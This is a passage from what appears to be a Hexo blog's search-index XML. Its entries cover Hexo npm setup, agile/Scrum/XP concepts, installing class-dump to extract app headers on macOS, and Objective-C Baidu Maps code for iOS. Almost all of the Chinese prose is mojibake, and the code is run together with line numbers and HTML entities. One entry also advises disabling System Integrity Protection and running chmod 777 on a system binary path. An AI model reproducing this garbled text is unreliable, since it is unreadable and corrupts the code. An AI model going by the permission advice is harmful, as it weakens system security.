é…ç½®è¿è¡ŒçŽ¯å¢ƒï¼Œæ‰§è¡Œå¦‚ä¸‹æŒ‡ä»¤ 12brew install node // å®‰è£…Node.jsnpm install -g hexo // å®‰è£…hexo åˆ‡æ¢åˆ°åšå®¢ç›®å½•ä¸‹å®‰è£…åšå®¢æ¨¡å—å’Œæ’ä»¶ (å…·ä½“å‚è€ƒä¹‹å‰å®‰è£…è¿‡çš„æ’ä»¶) 12345678910111213npm install npm install hexo-deployer-git --save npm install hexo-generator-feed --save npm install hexo-generator-sitemap --save npm install hexo-generator-feed --save npm install hexo-generator-searchdb --save npm install -g gulp npm install gulp-minify-css --save npm install gulp-uglify --save npm install gulp-htmlmin --save npm install gulp-htmlclean --save npm install gulp-imagemin --save åˆå¯ä»¥æ„‰å¿«çš„éšæ—¶éšåœ°å†™æ–‡ç« äº†ðŸ˜‚ å‚è€ƒ Macæ­å»ºHexoåšå®¢åŠNexTä¸»é¢˜é…ç½®ä¼˜åŒ– å…è´¹ä¸ªäººåšå®¢æ­å»ºè¯¦è§£ Hexo+Nextä¸ªäººåšå®¢ä¸»é¢˜ä¼˜åŒ– åˆ©ç”¨Hexoåœ¨å¤šå°ç”µè„‘ä¸Šæäº¤å’Œæ›´æ–°github pagesåšå®¢]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>Blog</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ•æ·å¼€å‘]]></title>
    <url>%2Farchives%2Fed2e9abb.html</url>
    <content type="text"><![CDATA[æ˜¥æ—¥æ¸¸ï¼ŒæèŠ±å¹æ»¡å¤´ã€‚é™Œä¸Šè°å®¶å¹´å°‘è¶³é£Žæµï¼Ÿ ä¼ ç»Ÿçš„è½¯ä»¶å¼€å‘æ¨¡å¼éœ€è¦ç»åŽ†é—®é¢˜è¯„ä¼°ã€è®¡åˆ’è§£å†³æ–¹æ¡ˆã€è®¾è®¡ç³»ç»Ÿæž¶æž„ã€å¼€å‘ä»£ç ã€æµ‹è¯•ã€éƒ¨ç½²å’Œä½¿ç”¨ç³»ç»Ÿã€ç»´æŠ¤è§£å†³æ–¹æ¡ˆç­‰è¿‡ç¨‹ã€‚ å¦‚ç€‘å¸ƒæµæ¨¡å¼: å®ƒæ˜¯ä»¥æ–‡æ¡£ä¸ºé©±åŠ¨ï¼Œåœ¨æ•´ä¸ªå¼€å‘è¿‡ç¨‹ä¸­ï¼Œå¼€å‘äººå‘˜æ ¹æ®éœ€æ±‚æ–‡æ¡£è¿›è¡Œå¼€å‘ï¼Œä¸€åˆ‡ä»¥æ–‡æ¡£ä¸ºä¾æ®ã€‚ ç¼ºç‚¹ ç”±äºŽå¼€å‘æ¨¡åž‹æ˜¯çº¿æ€§çš„ï¼Œç”¨æˆ·åªæœ‰ç­‰åˆ°æ•´ä¸ªè¿‡ç¨‹çš„æœ«æœŸæ‰èƒ½è§åˆ°å¼€å‘æˆæžœï¼Œä»Žè€Œå¢žåŠ äº†å¼€å‘çš„é£Žé™©ï¼› æ—©æœŸçš„é”™è¯¯å¯èƒ½è¦ç­‰åˆ°å¼€å‘åŽæœŸçš„æµ‹è¯•é˜¶æ®µæ‰èƒ½å‘çŽ°ï¼Œè¿›è€Œå¸¦æ¥ä¸¥é‡çš„åŽæžœã€‚ å„ä¸ªè½¯ä»¶ç”Ÿå‘½å‘¨æœŸè¡”æŽ¥èŠ±è´¹æ—¶é—´è¾ƒé•¿ï¼Œå›¢é˜Ÿäººå‘˜äº¤æµæˆæœ¬å¤§ã€‚ åœ¨éœ€æ±‚ä¸æ˜Žå¹¶ä¸”åœ¨é¡¹ç›®è¿›è¡Œè¿‡ç¨‹ä¸­å¯èƒ½å˜åŒ–çš„æƒ…å†µä¸‹åŸºæœ¬æ˜¯ä¸å¯è¡Œçš„ã€‚ è½¯ä»¶å¼€å‘çš„11ç§æ¨¡å¼ æ•æ·å¼€å‘(Agile Development) ä»€ä¹ˆæ˜¯æ•æ·å¼€å‘ 1ã€æ•æ·å¼€å‘(Agile Development)æ˜¯ä¸€ç§ä»¥äººä¸ºæ ¸å¿ƒã€è¿­ä»£ã€å¾ªåºæ¸è¿›çš„å¼€å‘æ–¹å¼ã€‚2ã€åœ¨æ•æ·å¼€å‘ä¸­ï¼Œè½¯ä»¶é¡¹ç›®çš„æž„å»ºè¢«åˆ‡åˆ†æˆå¤šä¸ªå­é¡¹ç›®ï¼Œå„ä¸ªå­é¡¹ç›®çš„æˆæžœéƒ½ç»è¿‡æµ‹è¯•ï¼Œå…·å¤‡é›†æˆå’Œå¯è¿è¡Œçš„ç‰¹å¾ã€‚3ã€å®ƒå¹¶ä¸æ˜¯ä¸€é—¨æŠ€æœ¯ï¼Œè€Œæ˜¯ä¸€ç§å¼€å‘æ–¹å¼ï¼Œæ˜¯ä¸€ç§è½¯ä»¶å¼€å‘çš„æµç¨‹ã€‚4ã€ä½œç”¨æŒ‡å¯¼æˆ‘ä»¬ç”¨è§„å®šçš„çŽ¯èŠ‚åŽ»ä¸€æ­¥ä¸€æ­¥å®Œæˆé¡¹ç›®çš„å¼€å‘ã€‚å› ä¸ºå®ƒé‡‡ç”¨çš„æ˜¯è¿­ä»£å¼å¼€å‘ï¼Œæ‰€ä»¥è¿™ç§å¼€å‘æ–¹å¼çš„ä¸»è¦é©±åŠ¨æ ¸å¿ƒæ˜¯äººã€‚ æ•æ·å¼€å‘é€‚ç”¨äºŽ å®¢æˆ·ä¸çŸ¥é“è‡ªå·±è¦å•¥çš„æƒ…å†µï¼Œè¿™æ ·çš„å®¢æˆ·å ç»å¤§å¤šæ•°ã€‚å› ä¸ºå®¢æˆ·ä¸çŸ¥é“è¦å•¥ï¼Œæ‰€ä»¥ä½ éœ€è¦ä¸æ–­å¸®å®¢æˆ·å¼„æ˜Žç™½ä»–åˆ°åº•æƒ³è¦å•¥ã€‚æ¢å¥è¯è¯´ï¼Œä½ éœ€è¦å’Œå®¢æˆ·æ²Ÿé€šï¼Œåˆä½œï¼Œå€¾å¬åé¦ˆï¼ŒæŒç»­æ”¹è¿›ï¼› ç«žäº‰æ¿€çƒˆçš„å¸‚åœºï¼Œè¿™æ ·çš„æƒ…å†µä¸‹ï¼Œèµ¶åœ¨ç«žäº‰å¯¹æ‰‹å‰äº¤ä»˜ä¸€ä¸ªä¸å®Œç¾Žä½†è‡³å°‘èƒ½ç”¨çš„äº§å“éžå¸¸é‡è¦ï¼› å¿«é€Ÿå˜åŒ–çš„å¸‚åœºï¼Œä½ åœ¨åŸ‹å¤´é€ ä¸€è¾†æ±½è½¦çš„æ—¶å€™ï¼Œå®¢æˆ·å·²ç»æƒ³å¼€é£žæœºæ»¡å¤©é£žäº†ï¼Œè¿™å°±éœ€è¦ä½ èƒ½ä¸€æ­¥æ­¥çš„æŠŠæ±½è½¦æ”¹æˆé£žæœºï¼Œè¿˜èƒ½æŒ‰æ—¶äº¤ä»˜ï¼› é€‚ç”¨äºŽåœ¨ä¸€ä¸ªåœ°æ–¹åŠžå…¬çš„å°å›¢é˜Ÿï¼Œä¸€èˆ¬ 10 ä¸ªäººä»¥å†…ã€‚è¿™æ ·èƒ½ä½¿æ•æ·ä¸­ä¸»è¦çš„æ²Ÿé€šæ–¹å¼ã€ŒFace to Faceã€æ˜¯å¯è¡Œçš„ã€‚ æ•æ·å¼€å‘æµç¨‹ æ•æ·å¼€å‘å®žçŽ°æ–¹å¼ Scrum XP Scrum é¡¹ç›®è§’è‰² äº§å“è´Ÿè´£äººï¼ˆProduct Ownerï¼‰ï¼šä¸»è¦è´Ÿè´£ç¡®å®šäº§å“çš„åŠŸèƒ½å’Œè¾¾åˆ°è¦æ±‚çš„æ ‡å‡†ï¼ŒæŒ‡å®šè½¯ä»¶çš„å‘å¸ƒæ—¥æœŸå’Œäº¤ä»˜çš„å†…å®¹ï¼ŒåŒæ—¶æœ‰æƒåŠ›æŽ¥å—æˆ–æ‹’ç»å¼€å‘å›¢é˜Ÿçš„å·¥ä½œæˆæžœã€‚ æµç¨‹ç®¡ç†å‘˜ï¼ˆScrum Masterï¼‰ï¼šä¸»è¦è´Ÿè´£æ•´ä¸ªScrumæµç¨‹åœ¨é¡¹ç›®ä¸­çš„é¡ºåˆ©å®žæ–½å’Œè¿›è¡Œï¼Œä»¥åŠæ¸…é™¤æŒ¡åœ¨å®¢æˆ·å’Œå¼€å‘å·¥ä½œä¹‹é—´çš„æ²Ÿé€šéšœç¢ï¼Œä½¿å¾—å®¢æˆ·å¯ä»¥ç›´æŽ¥é©±åŠ¨å¼€å‘ã€‚ å¼€å‘å›¢é˜Ÿï¼ˆScrum Teamï¼‰ï¼šä¸»è¦è´Ÿè´£è½¯ä»¶äº§å“åœ¨Scrumè§„å®šæµç¨‹ä¸‹è¿›è¡Œå¼€å‘å·¥ä½œï¼Œäººæ•°æŽ§åˆ¶åœ¨5~10äººå·¦å³ï¼Œæ¯ä¸ªæˆå‘˜å¯èƒ½è´Ÿè´£ä¸åŒçš„æŠ€æœ¯æ–¹é¢ï¼Œä½†è¦æ±‚æ¯æˆå‘˜å¿…é¡»è¦æœ‰å¾ˆå¼ºçš„è‡ªæˆ‘ç®¡ç†èƒ½åŠ›ï¼ŒåŒæ—¶å…·æœ‰ä¸€å®šçš„è¡¨è¾¾èƒ½åŠ›ï¼›æˆå‘˜å¯ä»¥é‡‡ç”¨ä»»ä½•å·¥ä½œæ–¹å¼ï¼Œåªè¦èƒ½è¾¾åˆ°Sprintçš„ç›®æ ‡ã€‚ XPï¼ˆExtreme Programmingï¼‰ä»€ä¹ˆæ˜¯XP æžé™ç¼–ç¨‹ï¼ˆeXtreme Programmingï¼‰ï¼Œæ˜¯ä¸€ç§å…¨æ–°çš„ã€è½»é‡çº§çš„ã€çµå·§çš„è½¯ä»¶å¼€å‘æ–¹æ³•ï¼Œæ˜¯ä¸€ç§è½¯ä»¶å·¥ç¨‹æ–¹æ³•å­¦ã€‚å®ƒå¼ºè°ƒç¨‹åºè®¾è®¡å›¢é˜Ÿä¸Žä¸šåŠ¡ä¸“å®¶ä¹‹é—´çš„ç´§å¯†åä½œã€é¢å¯¹é¢çš„æ²Ÿé€šï¼ˆæ¯”ä¹¦é¢çš„æ–‡æ¡£æ›´æœ‰æ•ˆï¼‰ã€é¢‘ç¹äº¤ä»˜æ–°çš„è½¯ä»¶ç‰ˆæœ¬ã€ç´§å‡‘è€Œè‡ªæˆ‘ç»„ç»‡åž‹çš„å›¢é˜Ÿã€èƒ½å¤Ÿå¾ˆå¥½çš„é€‚åº”éœ€æ±‚å˜åŒ–çš„ä»£ç ç¼–å†™å’Œå›¢é˜Ÿç»„ç»‡æ–¹æ³•ï¼Œæ›´æ³¨é‡è½¯ä»¶å¼€å‘ä¸­äººçš„ä½œç”¨ã€‚ XPçš„æ ¸å¿ƒæ˜¯æ²Ÿé€šï¼ˆCommunicationï¼‰ã€ç®€å•ï¼ˆSimplicityï¼‰ã€åé¦ˆï¼ˆFeedbackï¼‰ã€å‹‡æ°”ï¼ˆCourageï¼‰å››å¤§ä»·å€¼è§‚ï¼Œå®ƒä»¬æ˜¯XPçš„åŸºç¡€ï¼Œä¹Ÿæ˜¯XPçš„çµé­‚ã€‚æ•æ·å¼€å‘ä¹‹XP æ•æ·å¼€å‘ä¸­XPä¸ŽSCRUMçš„åŒºåˆ« 1ã€è¿­ä»£é•¿åº¦çš„ä¸åŒ XPçš„ä¸€ä¸ªSprintçš„è¿­ä»£é•¿åº¦å¤§è‡´ä¸º1~2å‘¨, è€ŒScrumçš„è¿­ä»£é•¿åº¦ä¸€èˆ¬ä¸º 2~ 4å‘¨. 2ã€åœ¨è¿­ä»£ä¸­, æ˜¯å¦å…è®¸ä¿®æ”¹éœ€æ±‚ XPåœ¨ä¸€ä¸ªè¿­ä»£ä¸­ï¼Œå¦‚æžœä¸€ä¸ªUser Story(ä¸€ä¸ªç”¨æˆ·éœ€æ±‚)è¿˜æ²¡æœ‰å®žçŽ°ï¼Œ åˆ™å¯ä»¥è€ƒè™‘ç”¨å¦å¤–çš„éœ€æ±‚å°†å…¶æ›¿æ¢ï¼Œæ›¿æ¢çš„åŽŸåˆ™æ˜¯éœ€æ±‚å®žçŽ°çš„æ—¶é—´é‡æ˜¯ç›¸ç­‰çš„ã€‚ è€ŒScrumæ˜¯ä¸å…è®¸è¿™æ ·åšçš„ï¼Œä¸€æ—¦è¿­ä»£å¼€å·¥ä¼šå®Œæ¯•, ä»»ä½•éœ€æ±‚éƒ½ä¸å…è®¸æ·»åŠ è¿›æ¥ï¼Œå¹¶æœ‰Scrum Masterä¸¥æ ¼æŠŠå…³ï¼Œä¸å…è®¸å¼€å‘å›¢é˜Ÿå—åˆ°å¹²æ‰° åœ¨è¿­ä»£ä¸­ï¼ŒUser Storyæ˜¯å¦ä¸¥æ ¼æŒ‰ç…§ä¼˜å…ˆçº§åˆ«æ¥å®žçŽ° XPæ˜¯åŠ¡å¿…è¦éµå®ˆä¼˜å…ˆçº§åˆ«çš„ã€‚ ä½†Scrumåœ¨è¿™ç‚¹åšå¾—å¾ˆçµæ´»ï¼Œ å¯ä»¥ä¸æŒ‰ç…§ä¼˜å…ˆçº§åˆ«æ¥åš Scrumè¿™æ ·å¤„ç†çš„ç†ç”±æ˜¯ï¼šå¦‚æžœä¼˜å…ˆé—®é¢˜çš„è§£å†³è€…ï¼Œç”±äºŽå…¶å®ƒäº‹æƒ…è€½æï¼Œä¸èƒ½è®¤é¢†ä»»åŠ¡ï¼Œé‚£ä¹ˆæ•´ä¸ªè¿›åº¦å°±è€½è¯¯äº†ã€‚ å¦å¤–ä¸€ä¸ªåŽŸå› æ˜¯ï¼Œå¦‚æžœæŒ‰ä¼˜å…ˆçº§æŽ’åºçš„User Story #6å’Œ#10ï¼Œè™½ç„¶#6ä¼˜å…ˆçº§é«˜ï¼Œä½†æ˜¯å¦‚æžœ#6çš„å®žçŽ°è¦ä¾èµ–äºŽ#10ï¼Œåˆ™ä¸å¾—ä¸ä¼˜å…ˆåš#10. 3ã€è½¯ä»¶çš„å®žæ–½è¿‡ç¨‹ä¸­ï¼Œæ˜¯å¦é‡‡ç”¨ä¸¥æ ¼çš„å·¥ç¨‹æ–¹æ³•ï¼Œä¿è¯è¿›åº¦æˆ–è€…è´¨é‡ Scrumæ²¡æœ‰å¯¹è½¯ä»¶çš„æ•´ä¸ªå®žæ–½è¿‡ç¨‹å¼€å‡ºä¸ªå·¥ç¨‹å®žè·µçš„å¤„æ–¹ï¼Œè¦æ±‚å¼€å‘è€…è‡ªè§‰ä¿è¯ã€‚ ä½†XPå¯¹æ•´ä¸ªæµç¨‹æ–¹æ³•å®šä¹‰éžå¸¸ä¸¥æ ¼ï¼Œè§„å®šéœ€è¦é‡‡ç”¨TDD, è‡ªåŠ¨æµ‹è¯•ï¼Œ ç»“å¯¹ç¼–ç¨‹ï¼Œç®€å•è®¾è®¡ï¼Œé‡æž„ç­‰çº¦æŸå›¢é˜Ÿçš„è¡Œä¸ºã€‚]]></content>
      <categories>
        <category>æ•´ç†</category>
      </categories>
      <tags>
        <tag>æ•æ·å¼€å‘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ±‡ç¼–åˆè¯†ï¼ˆMac)]]></title>
    <url>%2Farchives%2F24e561e5.html</url>
    <content type="text"><![CDATA[class-dump å…¥é—¨ä»‹ç»åŠä½¿ç”¨ã€‚ Decompileclass-dumpå®‰è£…æ–¹æ³•å½“Macå‡çº§äº†OSX 10.11åŽï¼Œé…ç½®class-dumpçš„æ—¶å€™ï¼Œä¼šå‘çŽ°æŽ¨èçš„class-dumpæ— æ³•æ”¾å…¥ç›®å½•/usr/bin åŽŸå› æ˜¯ OSX10.11çš„ä¸€ä¸ªæ–°ç‰¹æ€§ Rootless,ä¹Ÿå«System Integrity Protectionï¼ˆSIPï¼‰å’ŒSELinuxå·®ä¸å¤šï¼Œéƒ½æ˜¯é™åˆ¶rootç”¨æˆ·çš„æƒé™ å…¶å®žå¯ä»¥åœ¨RecoveryModeå…³é—­è¿™ä¸ªç‰¹æ€§ï¼Œè¿™æ ·å°±ç›´æŽ¥å¯ä»¥è¯»å†™/usr/binäº†ï¼Œä¸è¿‡ä¸å»ºè®®ã€‚ å…³é—­æ–¹æ³•ï¼šå¼€æœºçš„æ—¶å€™æŒ‰ä½optionå‡ºçŽ°é€‰æ‹©ç£ç›˜çš„ç•Œé¢æŒ‰command + Rè¿›å…¥RecoveryModeï¼Œé€‰æ‹©å®žç”¨å·¥å…·ç»ˆç«¯ï¼Œè¾“å…¥csrutil disableå›žè½¦æžå®š class-dumpä¸‹è½½åœ°å€ http://stevenygard.com/projects/class-dump/ å®‰è£…æ–¹æ³•1 æŸ¥çœ‹ç£ç›˜æ ¹ç›®å½•æ˜¯å¦å­˜åœ¨~/binè·¯å¾„ï¼Œå­˜åœ¨å°±ä¸‹ä¸€æ­¥ï¼Œä¸å­˜åœ¨ï¼Œæ‰“å¼€Terminalï¼Œè¾“å…¥mkdir ~/binï¼Œåœ¨å½“å‰ç”¨æˆ·æ ¹ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªbinç›®å½•ã€‚ æŠŠä¸‹è½½ä¸‹æ¥çš„dmgæ‰“å¼€ï¼Œå¤åˆ¶æ–‡ä»¶æ–‡ä»¶é‡Œé¢çš„class-dumpåˆ°åˆ›å»ºçš„binç›®å½•ä¸‹ã€‚èµ‹æƒé™:chmod +x ~/bin/class-dump æ‰“å¼€bash_profileæ–‡ä»¶é…ç½®çŽ¯å¢ƒå˜é‡ vim ~/.bash_profile æŒ‰ä¸‹ i é”®è¿›å…¥ç¼–è¾‘çŠ¶æ€ï¼Œåœ¨æœ€ä¸‹æ–¹åŠ ä¸€è¡Œexport PATH=$HOME/bin/:$PATH æŒ‰ä¸‹escé”®, å†æŒ‰shift+: è¾“å…¥ wq! è¿›è¡Œä¿å­˜é€€å‡ºç¼–è¾‘ åœ¨Terminalä¸­æ‰§è¡Œsource ~/.bash_profile æ‰§è¡Œclass-dumpæµ‹è¯•æ˜¯å¦æˆåŠŸï¼ŒæˆåŠŸå¦‚ä¸‹ï¼š 12345678910111213141516171819202122MelodydeMBP:~ melody$ class-dumpclass-dump 3.5 (64 bit)Usage: class-dump [options] &lt;mach-o-file&gt;where options are:-a show instance variable offsets-A show implementation addresses--arch &lt;arch&gt; choose a specific architecture from a universal binary (ppc, ppc64, i386, x86_64, armv6, armv7, armv7s, arm64)-C &lt;regex&gt; only display classes matching regular expression-f &lt;str&gt; find string in method name-H generate header files in current directory, or directory specified with -o-I sort classes, categories, and protocols by inheritance (overrides -s)-o &lt;dir&gt; output directory used for -H-r recursively expand frameworks and fixed VM shared libraries-s sort classes and categories by name-S sort methods by name-t suppress header in output, for testing--list-arches list the arches in the file, then exit--sdk-ios specify iOS SDK version (will look in /Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS&lt;version&gt;.sdk--sdk-mac specify Mac OS X version (will look in /Developer/SDKs/MacOSX&lt;version&gt;.sdk--sdk-root specify the full SDK root path (or use --sdk-ios/--sdk-mac for a shortcut)MelodydeMBP:~ melody$ æŽ¨èå®‰è£…æ–¹æ³•2 ä¸‹è½½åŽè§£åŽ‹åŽä¼šæœ‰class-dumpå’Œæºç æ–‡ä»¶ã€‚ å°†class-dumpå¤åˆ¶åˆ°/usr/bin/class-dumpã€‚ å¦‚æžœæ˜¯OS X 10.11ï¼Œå› ä¸ºæ²¡æœ‰/usr/binæ–‡ä»¶å¤¹çš„å†™æƒé™ï¼Œæ‰€ä»¥å°†class-dumpå¤åˆ¶åˆ°/usr/local/bin/class-dumpå³å¯ã€‚ æ‰“å¼€Terminalï¼Œæ‰§è¡Œå‘½ä»¤èµ‹äºˆå…¶æ‰§è¡Œæƒé™ï¼š 1sudo chmod 777 /usr/bin/class-dump æ‰§è¡Œclass-dumpæµ‹è¯•æ˜¯å¦æˆåŠŸ. class-dumpä½¿ç”¨å‘½ä»¤å¦‚ä¸‹ï¼š1class-dump -H /Users/sevencho/Desktop/KYRemoteUnit.app -o /Users/sevencho/Desktop/headers -H ä»£è¡¨ç€è¦è§£æžçš„æ–‡ä»¶ /Users/sevencho/Desktop/KYRemoteUnit.app éœ€è¦åç¼–è¯‘çš„åº”ç”¨è·¯å¾„ï¼ˆè§£åŽ‹.ipaåŒ…èŽ·å¾—ï¼‰ -o è¡¨ç¤ºè§£æžå®Œæˆä¿å­˜çš„ç›®å½• /Users/sevencho/Desktop/headers åç¼–è¯‘å‡ºçš„å¤´æ–‡ä»¶å­˜æ”¾è·¯å¾„ åˆ©ç”¨ class-dump å¯ä»¥å¯¼å‡º AppKitï¼ŒUIKitAppKit :1class-dump /System/Library/Frameworks/AppKit.framework UIKit :1class-dump /Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS.sdk/System/Library/Frameworks/UIKit.framework]]></content>
      <categories>
        <category>æ±‡ç¼–</category>
      </categories>
      <tags>
        <tag>æ±‡ç¼–</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘ä¹‹åœ°å›¾ç¯‡(äºŒ)]]></title>
    <url>%2Farchives%2Fb3b6a999.html</url>
    <content type="text"><![CDATA[ç»¿èšæ–°é†…é…’ï¼Œçº¢æ³¥å°ç«ç‚‰ã€‚æ™šæ¥å¤©æ¬²é›ªï¼Œèƒ½é¥®ä¸€æ¯æ— ï¼Ÿ ç™¾åº¦åœ°å›¾1ã€æ³¨å†Œåœ°å›¾api key1234567// åœ¨ç¨‹åºå¯åŠ¨ä»£ç†æ–¹æ³•æ³¨å†Œbaidu map api key ç™¾åº¦å¼€å‘è€…å¹³å°èŽ·å–_mapManager = [[BMKMapManager alloc]init];// å¦‚æžœè¦å…³æ³¨ç½‘ç»œåŠæŽˆæƒéªŒè¯äº‹ä»¶ï¼Œè¯·è®¾å®š generalDelegateå‚æ•°BOOL ret = [_mapManager start:XSBaiduMapApiKey generalDelegate:nil];if (!ret) &#123; XSLog(@&quot;BMKMapManager start failed!&quot;);&#125; 2ã€åˆå§‹åŒ–åœ°å›¾ æ·»åŠ åœ°å›¾çš„åˆå§‹åŒ–é…ç½® 123456789101112131415161718192021222324252627282930313233343536373839404142434445- (void)setupBaiduMapView&#123; BMKMapView *mapView = [[BMKMapView alloc] initWithFrame:self.view.bounds]; mapView.mapType = BMKMapTypeStandard; // è®¾å®šä¸ºæ ‡å‡†åœ°å›¾ mapView.showsUserLocation = YES; mapView.userTrackingMode = BMKUserTrackingModeNone; // è®¾ç½®ç”¨æˆ·ä½ç½®å›¾æ ‡ç±»åž‹ mapView.showMapScaleBar = YES; BMKLocationViewDisplayParam *displayParam = [[BMKLocationViewDisplayParam alloc] init]; displayParam.locationViewImgName = @&quot;icon_center_point&quot;; displayParam.isAccuracyCircleShow = NO; [mapView updateLocationViewWithParam:displayParam];// é…ç½®ç”¨æˆ·ä½ç½®ä¿¡æ¯å¦‚ç²¾åº¦åœˆã€å›¾æ ‡ mapView.zoomLevel = kMapsZoomLevel; mapView.minZoomLevel = kMapsMinZoomLevel; mapView.maxZoomLevel = kMapsMaxZoomLevel; [self.view insertSubview:mapView atIndex:0]; self.baiduMapView = mapView; // å®šä½æœåŠ¡ BMKLocationService *locService = [[BMKLocationService alloc] init]; locService.desiredAccuracy = kCLLocationAccuracyNearestTenMeters; [locService startUserLocationService]; self.locService = locService; // ååœ°ç†ç¼–ç  BMKGeoCodeSearch *geoCodeSearch = [[BMKGeoCodeSearch alloc] init]; self.geoCodeSearch = geoCodeSearch; // é’ˆå¯¹åˆ‡æ¢åœ°å›¾ç±»åž‹åŽè®¾ç½®ä»£ç† ï¼ˆå¦‚æžœæœ‰åšåœ°å›¾åˆ‡æ¢åŠŸèƒ½ï¼‰ self.baiduMapView.delegate = self; // æ­¤å¤„è®°å¾—ä¸ç”¨çš„æ—¶å€™éœ€è¦ç½®nilï¼Œå¦åˆ™å½±å“å†…å­˜çš„é‡Šæ”¾ self.locService.delegate = self; self.geoCodeSearch.delegate = self;&#125;-(void)viewWillAppear:(BOOL)animated&#123; [self.baiduMapView viewWillAppear]; self.baiduMapView.delegate = self; // æ­¤å¤„è®°å¾—ä¸ç”¨çš„æ—¶å€™éœ€è¦ç½®nilï¼Œå¦åˆ™å½±å“å†…å­˜çš„é‡Šæ”¾ self.locService.delegate = self; self.geoCodeSearch.delegate = self;&#125;-(void)viewWillDisappear:(BOOL)animated&#123; [self.baiduMapView viewWillDisappear]; self.baiduMapView.delegate = nil; // ä¸ç”¨æ—¶ï¼Œç½®nil self.locService.delegate = nil; self.geoCodeSearch.delegate = nil;&#125; å¼€å¯å®šä½æœåŠ¡å›žè°ƒï¼Œæ›´æ–°ç”¨æˆ·ä½ç½®ä¿¡æ¯ 1234567891011-(void)didUpdateBMKUserLocation:(BMKUserLocation *)userLocation&#123; XSLog(@&quot;didUpdateBMKUserLocationä½ç½® : %f,%f&quot;, userLocation.location.coordinate.latitude, userLocation.location.coordinate.longitude); [self.baiduMapView updateLocationData:userLocation]; self.userBaiduLocation = userLocation;&#125;- (void)didFailToLocateUserWithError:(NSError *)error&#123; XSLog(@&quot;error:%@&quot;, error);&#125; 3ã€æ˜¾ç¤ºè‡ªå®šä¹‰å¤§å¤´é’ˆ 3.1ã€ä»ŽæœåŠ¡å™¨èŽ·å–å½“å‰è®¾å¤‡çš„ç›¸å…³ä¿¡æ¯è½¬ä¸ºæ¨¡åž‹æ•°æ®(XSDeviceLocation *locationDetails) 3.2ã€æ ¹æ®å½“å‰æ˜¾ç¤ºçš„åœ°å›¾ç±»åž‹è®¾ç½®å¯¹åº”çš„åæ ‡ä¿¡æ¯å¤§å¤´é’ˆ æˆ‘çš„åšæ³•åœ¨XSDeviceLocationæ¨¡åž‹é‡Œé¢æä¾›äº†å¯¹åº”åœ°å›¾çš„èŽ·å–å±žæ€§ï¼Œåœ¨å±žæ€§getteræ–¹æ³•ä¸­è¿›è¡ŒæœåŠ¡å™¨çš„åæ ‡è½¬æ¢(å¤„ç†å›½å†…è¿”å›žç«æ˜Ÿåæ ‡ã€å›½å¤–è¿”å›žæ ‡å‡†åæ ‡) å¦‚èŽ·å–ç™¾åº¦åæ ‡locationCoordinateBaiduã€èŽ·å–è°·æ­Œåæ ‡locationCoordinateGoogle æ ¹æ®ç±»åž‹è®¾ç½®åæ ‡æ•°æ® 123456- (void)setupPetLocationCoordinate:(CLLocationCoordinate2D)coordinate mapType:(XSDisplayMapType)mapType&#123; // åæ ‡è¿‡æ»¤ç­‰å…¶ä»–æ“ä½œ // ... [self setupBaiduMapCoordinate:coordinate];&#125; 3.3ã€æ ¹æ®è®¾å¤‡åæ ‡çš„ç›¸å…³é…ç½® 12345678910111213141516171819202122232425262728- (void)setupBaiduMapCoordinate:(CLLocationCoordinate2D)coordinate&#123; [self.baiduMapView setCenterCoordinate:coordinate animated:YES]; // æ·»åŠ å¤§å¤´é’ˆæ¨¡åž‹æ•°æ® self.pointAnnotation.annotationType = XSAnnotationTypeLocationPoint; self.pointAnnotation.locationDetailsModel = self.locationDetails; self.pointAnnotation.coordinate = coordinate; [self.baiduMapView addAnnotation:self.pointAnnotation]; // æ·»åŠ ç²¾åº¦åœˆ !self.baiduAccuracyCircle ? : [self.baiduMapView removeOverlay:self.baiduAccuracyCircle]; // ç§»é™¤æ·»åŠ çš„ç²¾åº¦åœˆ if (self.locationDetails.GpsType == XSLocationModeWifiAndLbs || self.locationDetails.GpsType == XSLocationModeLbs) &#123; // wifi æ˜¾ç¤ºç²¾åº¦åœˆ self.baiduAccuracyCircle = [BMKCircle circleWithCenterCoordinate:coordinate radius:self.locationDetails.Radius]; [self.baiduMapView addOverlay:self.baiduAccuracyCircle]; &#125; // è§£æžåœ°å€ BMKReverseGeoCodeOption *reverseGeocodeSearchOption = [[BMKReverseGeoCodeOption alloc] init]; reverseGeocodeSearchOption.reverseGeoPoint = coordinate; if (![self.geoCodeSearch reverseGeoCode:reverseGeocodeSearchOption]) &#123; XSLog(@&quot;ç™¾åº¦ååœ°ç†ç¼–ç èŽ·å–åœ°å€å¤±è´¥&quot;); &#125; // è®¡ç®—åœ°å›¾åŒºåŸŸç¼©æ”¾ CLLocationDistance horizontalScreenDistance = [self horizontalScreenDistance]; if (self.locationDetails.Radius * 2 &lt; horizontalScreenDistance || self.baiduMapView.zoomLevel &lt;= kMapsMinZoomLevel) &#123; return; &#125; BMKCoordinateRegion region = BMKCoordinateRegionMakeWithDistance(coordinate, self.locationDetails.Radius * 2 + self.locationDetails.Radius / 2, self.locationDetails.Radius * 2 + self.locationDetails.Radius / 2); [self.baiduMapView setRegion:region animated:YES];&#125; è‡ªå®šä¹‰å¤§å¤´é’ˆæ¨¡åž‹XSPointAnnotationç»§æ‰¿è‡ªBMKPointAnnotation æ‰©å……ä¸¤ä¸ªå±žæ€§ï¼š annotationType ï¼šæžšä¸¾ï¼Œæ˜¾ç¤ºçš„å¤§å¤´é’ˆç±»åž‹ï¼ˆåˆ‡æ¢å›¾æ ‡ï¼‰ locationDetailsModel ï¼šå½“å‰å¤§å¤´é’ˆçš„æ¨¡åž‹æ•°æ®ï¼Œç‚¹å‡»æ˜¾ç¤ºæ°”æ³¡è¯¦æƒ…çš„æ•°æ® æ·»åŠ ç²¾åº¦åœˆåŽç²¾åº¦åŠå¾„è¿‡å¤§å¯èƒ½è¶…å‡ºå±å¹•å½±å“ç”¨æˆ·ä½“éªŒï¼Œè§£å†³æ–¹æ³•å¦‚ä¸‹ï¼š æ ¹æ®å±å¹•æœ€å·¦å’Œæœ€åŽä¸¤ä¸ªç‚¹ï¼Œè½¬æ¢å‡ºåœ°å›¾ä¸Šå¯¹åº”çš„åæ 